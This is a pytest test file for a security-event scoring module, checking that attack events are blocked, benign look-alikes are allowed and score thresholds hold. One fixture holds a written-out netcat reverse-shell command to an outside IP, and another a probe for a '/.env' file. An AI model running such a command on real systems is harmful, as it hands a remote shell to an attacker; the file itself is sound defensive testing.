"""core/rules: what must be stopped, and why -- one event at a time, as the
Flink job scores it."""

import pytest

from core.rules import action_for, score_event

QUIET = dict(
    source_ip="192.168.1.10", event_type="HTTP_REQUEST", is_internal_ip=1,
    requests_1m=40, failed_logins_1m=0, failed_logins_5m=0, unique_users_5m=1,
    port_scan_count_5m=0, unique_ports_5m=0, commands_executed_5m=0,
    login_frequency=0.0, is_night=0, command="", url_path="/dashboard",
    http_status=200, user_agent="Mozilla/5.0", request_signature="",
    is_attack_signature=0, is_scanner_agent=0, is_sensitive_path=0,
    is_sensitive_command=0, is_privileged=0, process_uid=1001,
    sensitive_commands_5m=0, attack_signatures_5m=0, http_errors_5m=0,
    http_404_1m=0, distinct_paths_5m=3, bytes_sent_5m=200_000,
)


def decide(**overrides):
    return score_event(dict(QUIET, **overrides))


@pytest.mark.parametrize(
    "overrides, rule",
    [
        (dict(request_signature="sqli", is_attack_signature=1), "sqli"),
        (dict(request_signature="path_traversal", is_attack_signature=1), "path_traversal"),
        (dict(is_scanner_agent=1), "scanner_agent"),
        (dict(event_type="COMMAND_EXECUTION", command="nc -e /bin/sh 1.2.3.4 4444"), "reverse_shell"),
        (dict(is_sensitive_command=1, is_privileged=1), "sensitive_command_as_root"),
        (dict(event_type="LOGIN_SUCCESS", failed_logins_5m=40), "login_after_brute_force"),
        (dict(failed_logins_1m=38), "brute_force"),
        (dict(unique_users_5m=9, failed_logins_5m=60), "password_spray"),
        (dict(unique_ports_5m=14), "port_scan"),
        (dict(port_scan_count_5m=8), "lateral_movement"),
        (dict(http_404_1m=45), "web_scan"),
        (dict(bytes_sent_5m=400_000_000), "data_exfiltration"),
    ],
)
def test_each_attack_is_blocked_with_its_reason(overrides, rule):
    decision = decide(**overrides)
    assert decision["recommended_action"] == "block"
    assert rule in decision["rule_hits"].split(",")


def test_normal_traffic_is_allowed():
    decision = decide()
    assert decision["recommended_action"] == "allow"
    assert decision["rule_hits"] == ""


@pytest.mark.parametrize(
    "overrides",
    [
        # all of these look alarming in isolation and are routine here
        dict(is_privileged=1, process_uid=0, command="rsync -a /srv/data /backup/data"),
        dict(http_status=404, http_404_1m=3),
        dict(requests_1m=800),
        dict(bytes_sent_5m=5_000_000),   # a legitimate monthly export
    ],
)
def test_benign_look_alikes_are_not_blocked(overrides):
    assert decide(**overrides)["recommended_action"] == "allow"


def test_a_single_sensitive_path_probe_alerts_but_does_not_block():
    decision = decide(is_internal_ip=0, is_sensitive_path=1, http_status=404, url_path="/.env")
    assert decision["recommended_action"] == "alert"


def test_every_rule_that_fired_is_recorded_strongest_first():
    decision = decide(request_signature="sqli", is_attack_signature=1, is_scanner_agent=1)
    assert decision["rule_hits"] == "sqli,scanner_agent"
    assert decision["final_anomaly_score"] == pytest.approx(0.95)


def test_action_thresholds():
    assert action_for(0.95) == "block"
    assert action_for(0.70) == "alert"
    assert action_for(0.30) == "allow"
